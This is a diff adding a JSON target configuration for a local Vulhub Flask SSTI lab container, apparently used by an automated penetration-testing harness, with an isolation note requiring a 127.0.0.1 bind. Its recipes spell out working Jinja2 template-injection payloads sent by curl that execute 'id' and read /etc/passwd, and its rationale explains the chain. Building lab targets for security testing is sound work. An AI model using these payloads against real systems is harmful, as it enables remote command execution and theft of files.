@@ -1,0 +1,23 @@
+{
+  "name": "Vulhub-Flask-SSTI",
+  "kind": "single-web-app-container",
+  "target": "http://127.0.0.1:8110",
+  "abstract_family": "rce_privesc",
+  "isolation_note": "Vulhub flask/ssti container, bound to 127.0.0.1:8110 only (no external route). Owned, disposable, local lab — restart the container to reset. Confirm the bind is 127.0.0.1 before authorizing.",
+  "eta_fill": {
+    "login": "/",
+    "wordlist": "/usr/share/wordlists/dirb/common.txt",
+    "webshell": "/",
+    "file": "/etc/passwd"
+  },
+  "eta_recipes": {
+    "http_fingerprint": "curl -s -i \"{target}/\"",
+    "content_retrieval": "curl -s \"{target}/?name=hello\"",
+    "vulnerability_check": "curl -s -g \"{target}/?name=%7B%7B7*7%7D%7D\"",
+    "exploit_attempt": "curl -s -g \"{target}/?name=%7B%7Bself.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27id%27).read()%7D%7D\"",
+    "command_execution": "curl -s -g \"{target}/?name=%7B%7Bself.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27id%27).read()%7D%7D\"",
+    "sensitive_file_read": "curl -s -g \"{target}/?name=%7B%7Bself.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27cat%20/etc/passwd%27).read()%7D%7D\""
+  },
+  "recommended_first": true,
+  "rationale": "Flask/Jinja2 Server-Side Template Injection (SSTI). `?name={{7*7}}` renders 49, confirming injection; `config`/`request` are absent from the template context but `self` is, so RCE goes via self.__init__.__globals__.__builtins__.__import__('os').popen(...).read() (empirically returns uid=33(www-data); reads /etc/passwd). Adds the SSTI vuln class (web template-injection -> command execution -> file read). Needs only curl; the eta_recipes carry the box-specific SSTI payload the generic templates cannot express."
+}
